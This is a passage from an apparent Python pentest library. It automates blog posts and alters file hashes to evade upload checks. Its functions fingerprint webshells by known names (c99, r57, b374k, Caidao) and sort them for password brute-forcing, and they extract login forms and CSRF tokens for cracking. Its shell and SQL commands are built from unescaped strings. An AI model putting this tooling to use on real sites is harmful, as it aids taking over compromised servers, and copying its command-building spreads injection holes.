    title1 = title.replace(' ', '-')
    filename = str(date) + '-' + title1 + '.md'

    file_abs_path = HOME_PATH + "/myblog/_posts/" + filename
    cmd = "cp ~/myblog/_posts/*隐藏webshell.md %s" % file_abs_path
    os.system(cmd)
    ubuntuCmd = "sed -i 's/^title.*/title:      %s/g' %s" % (
        title, file_abs_path)
    #macosCmd="sed -i '' 's/^title.*/title:      %s/g' %s" % (title, file_abs_path)
    macosCmd = "gsed -i 's/^title.*/title:      %s/g' %s" % (
        title, file_abs_path)
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    ubuntuCmd = "sed -i 's/date:       .*/date:       %s/g' %s" % (
        str(date), file_abs_path)
    #macosCmd="sed -i '' 's/date:       .*/date:       %s/g' %s" % (str(date), file_abs_path)
    macosCmd = "gsed -i 's/date:       .*/date:       %s/g' %s" % (
        str(date), file_abs_path)
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    ubuntuCmd = "sed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (
        title, file_abs_path)
    #macosCmd="sed -i '' 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (title, file_abs_path)
    macosCmd = "gsed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (
        title, file_abs_path)
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    ubuntuCmd = "sed -i '11,$d' %s" % file_abs_path
    #macosCmd="sed -i '' '11,$d' %s" % file_abs_path
    macosCmd = "gsed -i '11,$d' %s" % file_abs_path
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    ubuntuCmd = "sed -i 's/categories: web/categories: %s/g' %s" % (
        categories, file_abs_path)
    #macosCmd="sed -i '' 's/categories: web/categories: %s/g' %s" % (categories, file_abs_path)
    macosCmd = "gsed -i 's/categories: web/categories: %s/g' %s" % (
        categories, file_abs_path)
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    ubuntuCmd = "sed '/ - webshell/c\\\n%s' %s > /tmp/1" % (
        tags_write_to_file, file_abs_path)
    macosCmd = "gsed '/ - webshell/c\\\n%s' %s > /tmp/1" % (
        tags_write_to_file, file_abs_path)
    os.system(ubuntuCmd) if SystemPlatform != "Darwin" else os.system(macosCmd)
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    os.system("/Applications/MacVim.app/Contents/MacOS/Vim %s" % file_abs_path)

    print("do you want to update your remote 3xp10it.cc's blog?")
    print("your chioce: Y/n,default[Y]:>", end=' ')
    upa = input()
    if(upa == 'n' or upa == 'N'):
        print('done!bye:D')
    else:
        unsucceed = os.system("bash /usr/share/mytools/up.sh")
        if(unsucceed == 0):
            os.system("firefox %s" % "http://3xp10it.cc")


def get_remain_time(
        start_time,
        biaoji_time,
        remain_time,
        jiange_num,
        changing_var,
        total_num):
    # 显示完成一件事所需时间
    # start_time是开始进行时的时间变量
    # biaoji_time是用来标记每次经过jiange_num次数后的时间标记,biaoji_time是个"对当前函数全局"变量
    # remain_time是每隔jiange_num次后计算出的当前剩余完成时间
    # jiange_num是每间隔多少次计算处理速度
    # changing_var是会变化(从0到total_num)的变量
    # total_num是一件事的所有的次数
    # eg.show_remain_time(start[0],biaoji[0],temp_remain_time[0],20,current_num,230000)
    if changing_var == 1:
        biaoji_time = start_time
        return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
    else:
        if changing_var % jiange_num == 0:
            nowtime = time.time()
            spend_time = nowtime - biaoji_time
            biaoji_time = nowtime
            speed = jiange_num / spend_time
            remain_time = (total_num - changing_var) / speed
            return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
        else:
            return remain_time


def hunxiao(folder_path):
    # 改变md5函数,简单的cmd命令达到混淆效果,可用于上传百度网盘
    # 只适用于windows平台
    import os
    # 上面这句是因为如果其他地方单独调用这一个函数使用from exp10it import hunxiao时不能把exp10it文件开头已经
    # import的os导入,因为这样的导入方式不能导入os
    print(
        "there will be a folder named 'new' which contains the new files,but attention!!! your files those \
are going to be handled,rename them to a normal name if the file name is not regular,otherwise,the \
os.system's cmd would not find the path")
    os.chdir(folder_path)
    all_files = os.listdir(".")
    os.system("echo 111 > hunxiao.txt")
    os.system("md new")
    for each in all_files:
        if each[
                :7] != "hunxiao" and each[-2:] != "py" and os.path.isdir(each) is False:
            # cmd="c:\\windows\\system32\\cmd.exe /c copy"
            ext = each.split('.')[-1]
            # print type(each[:-(len(ext)+1)])
            new_file_name = "hunxiao_%s.%s" % (each[:-(len(ext) + 1)], ext)
            cmd = "c:\\windows\\system32\\cmd.exe /c copy %s /b + hunxiao.txt /a new\\%s.%s" % (
                each, new_file_name, ext)
            os.system(cmd)
            # print cmd
    os.system("del hunxiao.txt")


def check_string_is_ip(string):
    # 检测输入的字符串是否是ip值,如果是则返回True,不是则返回False
    p = re.compile(
        "^((?:(2[0-4]\d)|(25[0-5])|([01]?\d\d?))\.){3}(?:(2[0-4]\d)|(255[0-5])|([01]?\d\d?))$")
    if re.match(p, string):
        return True
    else:
        return False


def check_string_is_domain(string):
    # 检测输入的字符串是否是域名格式,如果是则返回True,不是则返回False
    count = 0
    if string[0] == "." or string[-1] == ".":
        return False
    for each in string:
        if each == ".":
            count += 1

    if (count == 0 and string != "localhost") or count >= 6:
        return False
    return True


def config_file_has_key_value(file, section, key_name):
    # 检测配置文件中的节点中的键有没有具体值
    # 节点中没有键或键的值为空返回False
    # 否则返回True
    hasPlanValue = 0
    try:
        existPlan = get_key_value_from_config_file(file, section, key_name)
        if existPlan is not None and existPlan != "":
            hasPlanValue = 1
    except:
        # print("没有这项")
        pass
    if hasPlanValue == 0:
        return False
    return True


def update_file_key_value(file, key_name, sep, key_value):
    # 更新文件中的关键字的值
    # key_name中没有单双引号
    # sep为=或:
    if sep not in ['=', ':']:
        print("you separator is not = or :,this function is not suitable")
        return
    else:
        if os.path.exists(file):
            # sed加-r可以直接用()等特殊字符表示regxp,否则()在表示正则中的意义时等要写成\(\)
            # sed中如果有双引号可以用#替代/,这样就没有双引号不能用的问题了,要不然sed中不能用双引号
            if isinstance(key_value, str):
                sed_string = '''sed -r -i 's#%s[^\s]+#%s"%s"#g' %s''' % (
                    key_name + sep, key_name + sep, key_value, file)
                print(sed_string)
                os.system(sed_string)
            if isinstance(key_value, int):
                sed_string = "sed -r -i 's/%s[^\s]+/%s%s/g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
            else:
                sed_string = "sed -r -i 's#%s[^\s]+#%s%s#g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
        else:
            print("file not exists")
            return


def update_config_file_key_value(file, section, key_name, key_value):
    # 通过configparser模块的调用更新配置文件
    # section是[]里面的值
    if not os.path.exists(file):
        os.system("touch %s" % file)
    import configparser
    config = configparser.ConfigParser()
    config.read(file)
    sectionList = config.sections()
    if (isinstance(key_value, int) or '%' not in key_value) and not re.search(r":", key_name, re.I):
        # configparser模块的bug,无法写入'%'
        if section not in sectionList:
            config.add_section(section)
        config.set(section, key_name, str(key_value))
        with open(file, 'w') as f:
            config.write(f)
    else:
        with open(file) as f:
            content = f.read()
        # 这里的section在更新cookie时section为eg.https://www.baidu.com:8000的形式
        if not re.search(r"\n*\[%s\]\n*" % section.replace(".", "\."), content, re.I):
            # 没有这个域名section
            with open(file, "a+") as f:
                f.write("[%s]\n%s = %s\n\n" % (section, key_name, key_value))
        else:
            # 有这个域名section
            # 有这个域名section且有这个key_name
            tmp = re.search(r"(\[%s\]\n+(.+\n+)*)%s[^\n\S]*=[^\n\S]*.+" %
                            (section.replace(".", "\."), key_name), content, re.I)
            if tmp:
                # 有这个域名section且有这个key_name
                preContent = tmp.group(1)
                newcontent = re.sub(r"\[%s\]\n+(.+\n+)*%s[^\n\S]*=[^\n\S]*.+" %
                                    (section.replace(".", "\."), key_name), "%s%s = %s" % (preContent, section, key_name, key_value), content)
                os.system("rm %s" % file)
                with open(file, "a+") as f:
                    f.write(newcontent)
            else:
                # 有这个域名section但没有这个key_name
                tmp = re.search(r"(\[%s\]\n+(.+\n+)*)(\n+)(\[.*\])?" %
                                section.replace(".", "\."), content, re.I)
                preContent = tmp.group(1)
                input(preContent)
                huanhang = tmp.group(3)
                input(huanhang)
                sufContent = tmp.group(4)
                input(sufContent)
                if sufContent is None:
                    sufContent = ""
                newcontent = re.sub(r"\[%s\]\n+(.+\n+)*\n+(\[.*\])?" % section.replace(".", "\."), "%s%s = %s%s%s" %
                                    (preContent, key_name, key_value + "\n", huanhang, sufContent), content, re.I)
                input(newcontent)
                os.system("rm %s" % file)
                with open(file, "a+") as f:
                    f.write(newcontent)




def get_key_value_from_file(key, separator, file_abs_path):
    # 从文件中获取指定关键字的值,第一个参数为关键字,第二个参数为分隔符,第三个参数为文件绝对路径
    # 默认设置分隔符为":"和"="和" "和"    ",如果使用默认分隔符需要将第二个参数设置为'',也即无字符
    # 如果不使用默认分隔符,需要设置第二个参数为string类型如"="
    # 如果不存在对应的关键字则返回0
    separators = []
    if separator == '':
        separators = ['=', ':', ' ', '    ']
    else:
        separators.append(separator)

    f = open(file_abs_path, "r+")
    all = f.readlines()
    f.close()
    for each in all:
        each = re.sub(r'(\s)', "", each)
        for sep in separators:
            find1 = re.search(r"%s%s'(.*)'" % (key, sep), each)
            if find1:
                return find1.group(1)
            find2 = re.search(r'''%s%s"(.*)"''' % (key, sep), each)
            if find2:
                return find2.group(1)
            find3 = re.search(r'''%s%s([^'"]*)''' % (key, sep), each)
            if find3:
                return find3.group(1)

    return 0


def execute_sql_in_db(sql, db_name="mysql"):
    # 执行数据库命令
    # 返回值为fetchone()的返回值
    global DB_SERVER
    global DB_USER
    global DB_PASS
    print("current sql string is:")
    print(sql)

    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get -y install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip3 install MySQLdb")
        import MySQLdb

    try:

        conn = MySQLdb.connect(
                DB_SERVER,
                DB_USER,
                DB_PASS,
                db=db_name,
                port=3306,
                charset="utf8"
        )
        conn.autocommit(1)
        cur = conn.cursor()
        cur.execute('SET NAMES utf8')

        #print("sql is:")
        # print(sql)
        cur.execute(sql)
        result = cur.fetchall()
        #print("result is:")
        # print(result)

        return result
    except:
        import traceback
        traceback.print_exc()
        # 发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()


def write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value):
    # eg.write_string_to_sql("lll","exp10itdb","targets","scan_result","http_domain","https://www.baidu.com")
    # eg.write_string_to_sql(1,"exp10itdb","urls","cracked_admin_login_url","url",current_url)
    # 将string写入数据库
    # argv[1]:要写入的string
    # argv[2]:操作的数据库名
    # argv[3]:操作的表名
    # argv[4]:操作的列名
    # argv[5]:表的主键,默认为''(空)
    # argv[6]:表的主键值,默认为''(空)

    global DB_SERVER
    global DB_USER
    global DB_PASS
    global TARGETS_TABLE_NAME
    global FIRST_TARGETS_TABLE_NAME
    string = str(string)
    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get -y install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip3 install MySQLdb")
        import MySQLdb

    try:
        conn = MySQLdb.connect(
                DB_SERVER,
                DB_USER,
                DB_PASS,
                db=db_name,
                port=3306,
                charset="utf8")
        conn.autocommit(1)
        cur = conn.cursor()
        cur.execute('SET NAMES utf8')
        sql0 = "select * from `%s` where %s='%s'" % \
            (table_name, table_primary_key,
             MySQLdb.escape_string(table_primary_key_value))
        # print(sql0)
        cur.execute(sql0)
        result = cur.fetchone()
        if result is None:
            insert_new_http_domain = "replace into `%s`(%s) values('%s')" % (
                table_name, table_primary_key, MySQLdb.escape_string(str(table_primary_key_value)))
            cur.execute(insert_new_http_domain)
            # insert动作要commit,select的查询动作不用commit,execute就可以得到结果,可以最后再commit
            # conn.commit()
            strings_to_write = string
        else:
            # dec is a key word in mysql,so we should add `` here
            sql1 = "select %s from `%s` where %s='%s'" % (
                column_name, table_name, table_primary_key, MySQLdb.escape_string(table_primary_key_value))
            # print sql1
            cur.execute(sql1)
            data = cur.fetchone()
            if data[0] == '':
                strings_to_write = string
            else:
                strings_to_write = data[0] + '\r\n' + string

        if ((table_name == TARGETS_TABLE_NAME or table_name == FIRST_TARGETS_TABLE_NAME or table_name[-5:] == "_pang") and column_name == "http_domain") or (table_name[-5:] == "_urls" and column_name == "url"):
            pass
        else:
            sql2 = "update `%s` set %s='%s' where %s='%s'" % \
                (table_name, column_name, MySQLdb.escape_string(strings_to_write), table_primary_key,
                 MySQLdb.escape_string(table_primary_key_value))
            # print sql2
            cur.execute(sql2)
            # print sql2
            conn.commit()
        '''
        # sql0="replace into `%s`(%s) values('%s') on duplicate key update `%s`=%s+'%s'" % \
                (table_name,table_primary_key,table_primary_key_value,column_name,column_name,\
                MySQLdb.escape_string(string))
        # cur.execute(sql0)
        '''

    except:
        import traceback
        traceback.print_exc()
        # 发生错误回滚
        conn.rollback()
    finally:
        cur.close()
        conn.close()


def auto_write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value):
    # 自动写内容到数据库中,相比write_string_to_sql函数多了其他相关写内容到数据库的动作
    # 会在将一个column内容写到数据库时将其他的与之相关的可以确定的其他column中的可以填
    # 写的数据填入数据库,eg.targets表中填写http_domain时顺便填写domain
    # eg.urls表中填写url时顺便填写urls表中的http_domain
    # 只多写相同表中的可写的column,不同表中的可写column暂时不写
    global DB_SERVER
    global DB_NAME
    global DB_USER
    global DB_PASS
    global TARGETS_TABLE_NAME
    global FIRST_TARGETS_TABLE_NAME
    try:
        import MySQLdb
    except:
        # for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get -y install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip3 install MySQLdb")
        import MySQLdb
    # 首先将该写的写进去,下面会再看看有没有其他可写的column
    print("first column_name is:")
    print(column_name)
    write_string_to_sql(
        string,
        db_name,
        table_name,
        column_name,
        table_primary_key,
        table_primary_key_value)

    if (table_name == TARGETS_TABLE_NAME or table_name ==FIRST_TARGETS_TABLE_NAME) and column_name != "domain":
        print("column_name is:")
        print(column_name)

        domain_column_has_content = False
        try:
            conn = MySQLdb.connect(
                DB_SERVER,
                DB_USER,
                DB_PASS,
                db=db_name,
                port=3306,
                charset="utf8")
            conn.autocommit(1)
            cur = conn.cursor()
            if table_name[-5:]=="_pang" or table_name[-4:]=="_sub":
                sql0 = "select domain from `%s` where http_domain='%s'" % \
                    (table_name, MySQLdb.escape_string(table_primary_key_value))
            else:
                sql0 = "select domain from `%s` where start_url='%s'" % \
                    (table_name, MySQLdb.escape_string(table_primary_key_value))
            print("sql0 is:")
            print(sql0)
            cur.execute(sql0)
            # result是一个元组,查询的结果在result[0]里面,result[0]是个u"" unicode
            # string类型,如果查询内容为空则
            result = cur.fetchone()
            print("result is:")
            print(result)
            if result is None or result[0] == '':
                # 如果domain内容为空才写,否则说明已经写过了就不再写入了
                domain_column_has_content = False
            else:
                domain_column_has_content = True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        # 此时table_primary_key是http_domain,eg.http://www.baidu.com形式
        print("important value:")
        print(table_primary_key_value.split("//")[-1])
        if not domain_column_has_content:
            write_string_to_sql(table_primary_key_value.split(
                "//")[-1], DB_NAME, table_name, "domain", table_primary_key, table_primary_key_value)

    if table_name[-5:] == "_urls" and column_name != "http_domain":
        # 在写信息到数据库的urls表中时,把http_domain列顺便写进去
        http_domain_column_has_content = False
        try:
            conn = MySQLdb.connect(
                    DB_SERVER,
                    DB_USER,
                    DB_PASS,
                    db=DB_NAME,
                    port=3306,
                    charset="utf8")
            conn.autocommit(1)
            cur = conn.cursor()
            sql1 = "select http_domain from `%s` where url='%s'" % \
                (table_name, MySQLdb.escape_string(table_primary_key_value))
            cur.execute(sql1)
            result = cur.fetchone()
            if result is None or result[0] == '':
                http_domain_column_has_content = False
            else:
                http_domain_column_has_content = True
        except:
            import traceback
            traceback.print_exc()
            conn.rollback()
        finally:
            cur.close()
            conn.close()
        # 此时的table_primary_key是"url"
        if not http_domain_column_has_content:
            write_string_to_sql(
                get_http_domain_from_url(table_primary_key_value),
                DB_NAME,
                table_name,
                "http_domain",
                table_primary_key,
                table_primary_key_value)


def get_http_domain_pattern_from_url(url):
    # eg.从http://www.baidu.com/1/2.php中得到http://www.baidu.com的正则匹配类型
    # 也即将其中的.替换成\.
    http_domain = get_http_domain_from_url(url)
    '''
    split_string=http_domain.split(".")
    part_num=len(split_string)
    new_http_domain=""
    for i in range(part_num):
        new_http_domain+=(split_string[i]+"\.")
    new_http_domain=new_http_domain[:-2]
    return new_http_domain
    '''
    # 正则1句代码话顶6句代码
    return_value = re.sub(r'\.', '\.', http_domain)
    return return_value

def check_url_has_webshell_content(url,content,code,title):
    y1 = False
    belong2github = False
    y2 = ""

    # 过滤掉github.com里面的文件
    parsed = urlparse(url)
    pattern = re.compile(r"github.com")
    if re.search(pattern, parsed.netloc):
        belong2github = True

    # 根据url中的文件名检测url是否为webshell
    strange_filename_pattern = re.compile(
        r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",
        re.I)
    if re.match(
            strange_filename_pattern,
            url) and not belong2github and len(content) < 8000:
        y1 = True

    # 根据title检测url是否为webshell
    strange_title_pattern = re.compile(
        r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",
        re.I)
    if title is not None and code == 200:
        if re.search(
                strange_title_pattern,
                title) and not belong2github and len(content) < 8000:
            y1 = True

    if title is None and code == 200:
        # 如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content) == 0:
            new_http_domain = get_http_domain_pattern_from_url(url)
            new_http_domain = new_http_domain[:-2]
            # print new_http_domain
            # 配置文件匹配方法
            not_webshell_pattern = re.compile(
                r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" %
                new_http_domain, re.I)
            if re.search(not_webshell_pattern, url):
                y1 = False
            else:
                y1 = True
                y2 = "direct_bao"

        caidao_jsp_pattern = re.compile(r"->\|\|<-")
        if 0 < len(content) < 50 and re.search(caidao_jsp_pattern, content):
            # jsp的菜刀一句话
            y1 = True
            y2 = "direct_bao"

    # 根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern = re.compile(
        r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",
        re.I)
    if re.search(strang_filecontent_pattern, content) and len(content) < 8000:
        y1 = True

    # 如果正常返回大小很小,说明有可能是一句话
    # 1.返回结果为200且文件内容少且有关键字的为大马
    # 2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1 and 200 == code:
        webshell_flag = re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)", re.I)
        if len(content) < 8000 and re.search(
                r'''method=('|")?post('|")?''', content):
            y2 = "biaodan_bao"
        if len(content) > 8000 and re.search(
                r'''method=('|")?post('|")?''',
                content) and re.search(
                webshell_flag,
                content):
            y2 = "bypass"

    # 如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404 == code and len(content) < 600:
        url = re.sub(r"(\s)$", "", url)
        webshell_file_name = url.split("/")[-1]
        pattern = re.compile(r"%s" % webshell_file_name, re.I)
        if re.search(pattern, content):
            y1 = False
            y2 = ""
        else:
            if re.search(r'''method=('|")?post('|")?''', content) is None:
                y1 = True
                y2 = "direct_bao"
            else:
                y1 = True
                y2 = "biaodan_bao"

    return {
        'y1': y1,
        'y2': '%s' % y2,
        'y3': {
            "code": code,
            "title": title,
            "content": content}}




def check_webshell_url(url):
    # 检测url是否为webshell,并检测是webshell需要用html中搜索到的表单爆破还是用一句话类型爆破方式爆破
    # 返回结果为一个字典,有3个键值对
    # 第一个键为是否是webshell,用y1表示,y1为True或者False
    # 第二个键为webshell爆破方式,用y2表示
    # y2的值可能是
    # 1>"biaodan_bao"(根据搜到的表单爆)
    # 2>"direct_bao"(直接爆)
    # 3>""(空字符串,对应url不是webshell)
    # 4>"bypass"(对应url是一个webshll,且该webshell不用输入密码即可控制)
    # 第三个键为在http_get请求url所得的三个关键元素:code,title,content
    # y3的值是一个字典{"code":code,"title":title,"content":content}   其中code的类型为str

    y1 = False
    belong2github = False
    y2 = ""

    response_dict = get_request(url)
    code = response_dict['code']
    title = response_dict['title']
    # python3中得到的html为bytes类型,在get_request函数中已经content.decode("...")了
    content = response_dict['content']

    # 过滤掉github.com里面的文件
    parsed = urlparse(url)
    pattern = re.compile(r"github.com")
    if re.search(pattern, parsed.netloc):
        belong2github = True

    # 根据url中的文件名检测url是否为webshell
    strange_filename_pattern = re.compile(
        r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",
        re.I)
    if re.match(
            strange_filename_pattern,
            url) and not belong2github and len(content) < 8000:
        y1 = True

    # 根据title检测url是否为webshell
    strange_title_pattern = re.compile(
        r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",
        re.I)
    if title is not None and code == 200:
        if re.search(
                strange_title_pattern,
                title) and not belong2github and len(content) < 8000:
            y1 = True

    if title is None and code == 200:
        # 如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content) == 0:
            new_http_domain = get_http_domain_pattern_from_url(url)
            new_http_domain = new_http_domain[:-2]
            # print new_http_domain
            # 配置文件匹配方法
            not_webshell_pattern = re.compile(
                r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" %
                new_http_domain, re.I)
            if re.search(not_webshell_pattern, url):
                y1 = False
            else:
                y1 = True
                y2 = "direct_bao"

        caidao_jsp_pattern = re.compile(r"->\|\|<-")
        if 0 < len(content) < 50 and re.search(caidao_jsp_pattern, content):
            # jsp的菜刀一句话
            y1 = True
            y2 = "direct_bao"

    # 根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern = re.compile(
        r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",
        re.I)
    if re.search(strang_filecontent_pattern, content) and len(content) < 8000:
        y1 = True

    # 如果正常返回大小很小,说明有可能是一句话
    # 1.返回结果为200且文件内容少且有关键字的为大马
    # 2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1 and 200 == code:
        webshell_flag = re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)", re.I)
        if len(content) < 8000 and re.search(
                r'''method=('|")?post('|")?''', content):
            y2 = "biaodan_bao"
        if len(content) > 8000 and re.search(
                r'''method=('|")?post('|")?''',
                content) and re.search(
                webshell_flag,
                content):
            y2 = "bypass"

    # 如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404 == code and len(content) < 600:
        url = re.sub(r"(\s)$", "", url)
        webshell_file_name = url.split("/")[-1]
        pattern = re.compile(r"%s" % webshell_file_name, re.I)
        if re.search(pattern, content):
            y1 = False
            y2 = ""
        else:
            if re.search(r'''method=('|")?post('|")?''', content) is None:
                y1 = True
                y2 = "direct_bao"
            else:
                y1 = True
                y2 = "biaodan_bao"

    return {
        'y1': y1,
        'y2': '%s' % y2,
        'y3': {
            "code": code,
            "title": title,
            "content": content}}


def get_webshell_suffix_type(url):
    # 获取url所在的webshell的真实后缀类型,结果为asp|php|aspx|jsp
    url = re.sub(r'(\s)$', "", url)
    parsed = urlparse(url)
    len1 = len(parsed.scheme)
    len2 = len(parsed.netloc)
    main_len = len1 + len2 + 3
    len3 = len(url) - main_len
    url = url[-len3:]

    # php pattern
    pattern = re.compile(r"\.((php)|(phtml)).*", re.I)
    if re.search(pattern, url):
        return "php"

    # asp pattern
    pattern1 = re.compile(r"\.asp.*", re.I)
    pattern2 = re.compile(r"\.aspx.*", re.I)
    if re.search(pattern1, url):
        if re.search(pattern2, url):
            return "aspx"
        else:
            return "asp"
    pattern = re.compile(r"\.((asa)|(cer)|(cdx)).*", re.I)
    if re.search(pattern, url):
        return "asp"

    # aspx pattern
    pattern = re.compile(r"\.((aspx)|(ashx)|(asmx)|(ascx)).*", re.I)
    if re.search(pattern, url):
        return "aspx"

    # jsp pattern
    pattern = re.compile(r"\.((jsp)|(jspx)|(jspf)).*", re.I)
    if re.search(pattern, url):
        return "jsp"


def get_http_domain_from_url(url):
    # eg.http://www.baidu.com/1/2/3.jsp==>http://www.baidu.com
    parsed = urlparse(url)
    http_domain_value = parsed.scheme + "://" + parsed.hostname
    # print http_domain_value
    return http_domain_value


def get_http_netloc_from_url(url):
    # eg.http://www.baidu.com:8080/1/2/3.jsp==>http://www.baidu.com:8080
    # eg.http://www.baidu.com:80/1/2/3.jsp==>http://www.baidu.com
    parsed = urlparse(url)
    http_netloc_value = parsed.scheme + "://" + parsed.netloc
    return http_netloc_value


def get_user_and_pass_form_from_html(html):
    # 从html内容(管理员登录的html)中获取所有的form表单
    # 返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"form_action_url":"" 没有则相应返回值为"None",不是返回""(空字符串)
    html= re.sub(r"<!--.*-->","",html)
    user_form_name = None
    pass_form_name = None
    form_action_url = None
    user_pass_pattern = re.compile(
        r'''(.*<input .*>[\s\S]{1,500}?(<input .*type=('|")?password.*>))''',
        re.I)

    all_input_pattern = re.compile(
        r'''(.*<input .*>)''',
        re.I)

    all_input_line = re.findall(all_input_pattern, html)

    index = -1
    has_pass_form = False
    user_form_line=None
    pass_form_line=None
    for each in all_input_line:
        index += 1
        if re.search(r'''<input .*type=('|")?password.*>''', each):
            user_form_line = all_input_line[index - 1]
            pass_form_line = each
            has_pass_form = True

    user_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)
    pass_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)
    PASS_PATTERN = re.compile(
        r'''(<input .*type=("|')?password("|')?.*>)''', re.I)

    if index >= 1 and user_form_line is not None and pass_form_line is not None:
        # 既有user表单也有pass表单,标准的管理登录页面
        user_form_name = re.search(user_pattern, user_form_line).group(2)
        pass_form_name = re.search(pass_pattern, pass_form_line).group(2)

    elif has_pass_form and index == 0:
        # 只有pass表单,eg.大马webshell页面
        tmp = re.search(pass_pattern, pass_form_line)
        if tmp is not None and tmp.group(2) is not None:
            pass_form_name = tmp.group(2)

    # 下面找form_action_url表单
    form_action_url_pattern = re.compile(
        r'''form.*action=('|")?([^'"\s]{,100})('|")?.*>[\s\S]{,1000}?(<input .*type=('|")?password.*>)''', re.I)
    find_form_action_url = re.search(form_action_url_pattern, html)
    if find_form_action_url and find_form_action_url.group(2) is not None:
        form_action_url = find_form_action_url.group(2)

    return_value = {
        'user_form_name': user_form_name,
        'pass_form_name': pass_form_name,
        'form_action_url': form_action_url}
    # print return_value
    return return_value

def get_url_has_csrf_token(url):
    # test if url has csrf token
    # return a dict
    # return dict['hasCsrfToken']=True for has
    # return dict['hasCsrfToken']=False for has not
    # return dict['csrfTokenName']="csrf token param name value" or ""
    returnValue={'hasCsrfToken':False,'csrfTokenName':''}
    if "^" in url:
        url=url.split("^")[0]
    elif "?" in url:
        url=url.split("?")[0]
    hasCsrfToken=False
    a=get_request(url,by="seleniumPhantomJS")
    if a['hasFormAction']:
        firstCsrfToken=re.search(r"([^&?\^]*token[^=]*)=([^&]+)",a['formActionValue'],re.I)
        if firstCsrfToken:
            firstCsrfTokenValue=firstCsrfToken.group(2)
            b=get_request(url,by="seleniumPhantomJS")
            if b['hasFormAction']:
                secondCsrfTokenValue=re.search(r"([^&?\^]*token[^=]*)=([^&]+)",b['formActionValue'],re.I).group(2)
                if secondCsrfTokenValue!=firstCsrfTokenValue:
                    hasCsrfToken=True
                    csrfTokenName=firstCsrfToken.group(1)

    returnValue['hasCsrfToken']=hasCsrfToken
    returnValue['csrfTokenName']=csrfTokenName
    return returnValue



def get_user_and_pass_form_from_url(url):
